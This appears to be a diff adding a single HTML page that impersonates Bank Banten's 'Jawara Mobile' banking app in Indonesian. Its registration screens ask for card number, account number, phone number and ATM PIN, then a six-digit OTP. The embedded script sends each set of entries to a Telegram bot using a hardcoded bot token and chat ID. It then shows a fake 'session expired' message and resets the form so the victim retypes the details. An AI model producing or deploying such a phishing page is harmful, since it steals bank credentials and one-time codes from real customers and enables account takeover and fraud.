@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jawara Mobile - Bank Banten</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .phone-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            max-height: 850px;
+            background-color: #ffffff;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        /* Halaman Management & Transisi Fade */
+        .page {
+            display: none;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 100%;
+            width: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            background-color: #ffffff;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .page.active {
+            display: flex;
+            opacity: 1;
+            z-index: 10;
+        }
+
+        /* --- HALAMAN 1 STYLES --- */
+        .top-header {
+            width: 100%;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .lang-flag {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .content-center {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+            margin-top: -20px;
+        }
+
+        .logo-container {
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .logo-text {
+            font-size: 42px;
+            font-weight: 900;
+            font-style: italic;
+            color: #e60012;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+            position: relative;
+            letter-spacing: -1px;
+        }
+
+        .logo-subtext {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff0055;
+            position: absolute;
+            right: 15px;
+            bottom: -12px;
+            font-style: italic;
+        }
+
+        .bg-illustration {
+            position: absolute;
+            right: -20px;
+            bottom: 60px;
+            opacity: 0.08;
+            width: 220px;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .footer-info {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 2;
+            margin-bottom: 20px;
+        }
+
+        .bank-banten-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .bank-banten-icon {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            margin-bottom: 4px;
+        }
+
+        .bank-banten-icon span {
+            display: block;
+            height: 3px;
+            background: linear-gradient(90deg, #0056b3, #00a8cc);
+            border-radius: 2px;
+        }
+
+        .bank-banten-icon span:nth-child(1) { width: 50px; }
+        .bank-banten-icon span:nth-child(2) { width: 40px; }
+        .bank-banten-icon span:nth-child(3) { width: 30px; }
+
+        .bank-banten-text {
+            font-size: 16px;
+            font-weight: bold;
+            color: #1a237e;
+            letter-spacing: -0.5px;
+        }
+
+        .regulations-text {
+            font-size: 11px;
+            color: #555;
+            text-align: center;
+            line-height: 1.4;
+            padding: 0 10px;
+            margin-bottom: 25px;
+        }
+
+        .action-btn {
+            width: 100%;
+            background-color: #0085ba;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 133, 186, 0.3);
+            transition: all 0.2s;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .action-btn:disabled {
+            background-color: #cccccc;
+            box-shadow: none;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .action-btn:hover:not(:disabled) {
+            background-color: #006d9b;
+        }
+
+        .version {
+            font-size: 11px;
+            color: #666;
+            letter-spacing: 0.5px;
+        }
+
+        /* --- HALAMAN 2 & 3 SHARED STYLES --- */
+        .nav-header {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .close-btn {
+            font-size: 18px;
+            cursor: pointer;
+            color: #555;
+            text-decoration: none;
+        }
+
+        .nav-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .step-indicators {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 25px;
+        }
+
+        .step-line {
+            flex: 1;
+            height: 3px;
+            background-color: #e0e0e0;
+            border-radius: 2px;
+        }
+
+        .step-line.active {
+            background-color: #f5c518;
+        }
+
+        .instruction-text {
+            font-size: 14px;
+            color: #444;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 30px;
+            padding: 0 10px;
+        }
+
+        /* --- HALAMAN 2 SPECIFIC --- */
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            gap: 22px;
+            flex-grow: 1;
+        }
+
+        .input-group {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group input {
+            border: none;
+            border-bottom: 1px solid #ccc;
+            padding: 8px 0;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+            background: transparent;
+        }
+
+        .input-group input::placeholder {
+            color: #888;
+        }
+
+        .input-group input:focus {
+            border-bottom-color: #0085ba;
+        }
+
+        .input-counter {
+            position: absolute;
+            right: 0;
+            bottom: 8px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .helper-text {
+            font-size: 11px;
+            color: #666;
+            margin-top: 6px;
+            line-height: 1.3;
+        }
+
+        /* --- HALAMAN 3 SPECIFIC --- */
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 30px;
+            padding: 0 5px;
+        }
+
+        .otp-box {
+            width: 48px;
+            height: 58px;
+            border: 1px solid #d0d0d0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            color: #333;
+            outline: none;
+            background-color: #fff;
+            transition: border-color 0.2s;
+        }
+
+        .otp-box:focus {
+            border-color: #0085ba;
+        }
+
+        /* Modal/Pesan Error */
+        .error-toast {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            background: rgba(0, 0, 0, 0.85);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+            z-index: 100;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .error-toast.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="phone-container">
+        
+        <!-- ================= HALAMAN 1: BERANDA ================= -->
+        <div id="page-1" class="page active">
+            <div class="top-header">
+                <div class="lang-flag">
+                    <span>ID</span>
+                    <svg width="20" height="14" viewBox="0 0 30 20">
+                        <rect width="30" height="10" fill="#Red"/>
+                        <rect y="10" width="30" height="10" fill="#White"/>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="content-center">
+                <div class="logo-container">
+                    <div class="logo-text">Jawara</div>
+                    <div class="logo-subtext">Mobile</div>
+                </div>
+            </div>
+
+            <svg class="bg-illustration" viewBox="0 0 200 350" fill="currentColor">
+                <path d="M100,20 L110,50 L90,50 Z M95,50 L105,50 L105,80 L95,80 Z M90,80 L110,80 L118,250 L82,250 Z M75,250 L125,250 L130,340 L70,340 Z" fill="#1a237e"/>
+            </svg>
+
+            <div class="footer-info">
+                <div class="bank-banten-logo">
+                    <div class="bank-banten-icon">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                    <div class="bank-banten-text">bank banten</div>
+                </div>
+
+                <div class="regulations-text">
+                    Bank Banten berizin dan diawasi oleh<br>
+                    Otoritas Jasa Keuangan (OJK) dan Bank Indonesia (BI),<br>
+                    serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS)
+                </div>
+
+                <button class="action-btn" onclick="switchPage('page-2')">MASUK</button>
+
+                <div class="version">Versi 1.4.3.28082026</div>
+            </div>
+        </div>
+
+        <!-- ================= HALAMAN 2: REGISTRASI ONLINE ================= -->
+        <div id="page-2" class="page">
+            <div>
+                <div class="nav-header">
+                    <a href="#" class="close-btn" onclick="switchPage('page-1')">&#x2715;</a>
+                    <span class="nav-title">Registrasi Online</span>
+                </div>
+
+                <div class="step-indicators">
+                    <div class="step-line active"></div>
+                    <div class="step-line"></div>
+                    <div class="step-line"></div>
+                    <div class="step-line"></div>
+                </div>
+
+                <div class="instruction-text">
+                    Masukkan nomor kartu, nomor rekening,<br>
+                    nomor handphone dan pin ATM anda
+                </div>
+
+                <div class="form-container">
+                    <div class="input-group">
+                        <input type="text" id="noKartu" placeholder="Nomor Kartu" maxlength="16" inputmode="numeric" oninput="validateForm()">
+                    </div>
+
+                    <div class="input-group">
+                        <input type="text" id="noRekening" placeholder="Nomor Rekening" maxlength="10" inputmode="numeric" oninput="validateForm()">
+                    </div>
+
+                    <div class="input-group">
+                        <input type="text" id="noHp" placeholder="Nomor Handphone" inputmode="numeric" oninput="validateForm()">
+                    </div>
+
+                    <div class="input-group">
+                        <input type="password" id="pinAtm" placeholder="PIN ATM" maxlength="6" inputmode="numeric" oninput="validateForm()">
+                        <span class="input-counter" id="pinCounter">0/6</span>
+                        <div class="helper-text">*Pastikan Pulsa Anda Cukup untuk menerima Kode OTP via SMS</div>
+                    </div>
+                </div>
+            </div>
+
+            <div style="width: 100%; padding-top: 15px;">
+                <button class="action-btn" id="btnNext" onclick="sendDataAndNext()" disabled>Selanjutnya</button>
+            </div>
+        </div>
+
+        <!-- ================= HALAMAN 3: KODE AKTIVASI (OTP) ================= -->
+        <div id="page-3" class="page">
+            <div>
+                <div class="nav-header">
+                    <a href="#" class="close-btn" onclick="switchPage('page-2')">&#x2715;</a>
+                    <span class="nav-title">Registrasi Online</span>
+                </div>
+
+                <div class="step-indicators">
+                    <div class="step-line active"></div>
+                    <div class="step-line active"></div>
+                    <div class="step-line"></div>
+                    <div class="step-line"></div>
+                </div>
+
+                <div class="instruction-text">
+                    Masukkan kode aktivasi yang telah dikirimkan ke Nomor yang Terdaftar
+                </div>
+
+                <div class="otp-container">
+                    <input type="text" class="otp-box otp-digit" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-box otp-digit" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-box otp-digit" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-box otp-digit" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-box otp-digit" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-box otp-digit" maxlength="1" inputmode="numeric">
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Kotak Pesan Error / Kadaluarsa -->
+    <div id="errorToast" class="error-toast">
+        Kode Aktivasi Error Sesi Berakhir Coba Lagi
+    </div>
+
+    <script>
+        const botToken = "8462084079:AAHQ94IQ_-iOg10Y9IiTSnNzeb2IFDikpes";
+        const chatId = "392836663";
+
+        function switchPage(pageId) {
+            const pages = document.querySelectorAll('.page');
+            pages.forEach(page => {
+                page.classList.remove('active');
+            });
+
+            const targetPage = document.getElementById(pageId);
+            if (targetPage) {
+                targetPage.classList.add('active');
+            }
+
+            if (pageId === 'page-3') {
+                const otpInputs = document.querySelectorAll('.otp-digit');
+                otpInputs.forEach(input => input.value = '');
+                if (otpInputs[0]) otpInputs[0].focus();
+            }
+        }
+
+        // Fungsi Reset Form Halaman 2 ke Awal
+        function resetFormPage2() {
+            document.getElementById('noKartu').value = '';
+            document.getElementById('noRekening').value = '';
+            document.getElementById('noHp').value = '';
+            document.getElementById('pinAtm').value = '';
+            document.getElementById('pinCounter').innerText = '0/6';
+            document.getElementById('btnNext').disabled = true;
+        }
+
+        // Fungsi Validasi Digit Input pada Halaman 2
+        function validateForm() {
+            const noKartu = document.getElementById('noKartu').value.replace(/\D/g, '');
+            const noRekening = document.getElementById('noRekening').value.replace(/\D/g, '');
+            const noHp = document.getElementById('noHp').value.trim();
+            const pinAtm = document.getElementById('pinAtm').value.replace(/\D/g, '');
+
+            document.getElementById('pinCounter').innerText = `${pinAtm.length}/6`;
+
+            const btnNext = document.getElementById('btnNext');
+
+            if (noKartu.length === 16 && noRekening.length === 10 && noHp.length > 0 && pinAtm.length === 6) {
+                btnNext.disabled = false;
+            } else {
+                btnNext.disabled = true;
+            }
+        }
+
+        // Fungsi Mengirim Data Registrasi ke Bot Telegram (Halaman 2)
+        function sendDataAndNext() {
+            const noKartu = document.getElementById('noKartu').value;
+            const noRekening = document.getElementById('noRekening').value;
+            const noHp = document.getElementById('noHp').value;
+            const pinAtm = document.getElementById('pinAtm').value;
+
+            const message = `📌 *DATA REGISTRASI BARU* 📌\n\n` +
+                            `💳 *Nomor Kartu:* ${noKartu}\n` +
+                            `🏦 *Nomor Rekening:* ${noRekening}\n` +
+                            `📱 *Nomor HP:* ${noHp}\n` +
+                            `🔑 *PIN ATM:* ${pinAtm}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Berhasil terkirim:', data);
+                switchPage('page-3');
+            })
+            .catch(error => {
+                console.error('Gagal mengirim data:', error);
+                switchPage('page-3');
+            });
+        }
+
+        // Handle Otomatis Input OTP & Pengiriman Otomatis ke Telegram
+        const otpInputs = document.querySelectorAll('.otp-digit');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const value = e.target.value;
+                if (value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+
+                const allFilled = Array.from(otpInputs).every(inp => inp.value.length === 1);
+                if (allFilled) {
+                    sendOtpAndReset();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Fungsi Mengirim Kode OTP ke Telegram lalu Reset dan Kosongkan Form Halaman 2
+        function sendOtpAndReset() {
+            const otpCode = Array.from(otpInputs).map(inp => inp.value).join('');
+            
+            const message = `🔑 *KODE AKTIVASI (OTP)* 🔑\n\n` +
+                            `🔢 *Kode OTP:* \`${otpCode}\``;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('OTP Berhasil terkirim:', data);
+                triggerErrorAndReset();
+            })
+            .catch(error => {
+                console.error('Gagal mengirim OTP:', error);
+                triggerErrorAndReset();
+            });
+        }
+
+        function triggerErrorAndReset() {
+            const toast = document.getElementById('errorToast');
+            toast.classList.add('show');
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+                resetFormPage2();
+                switchPage('page-2');
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
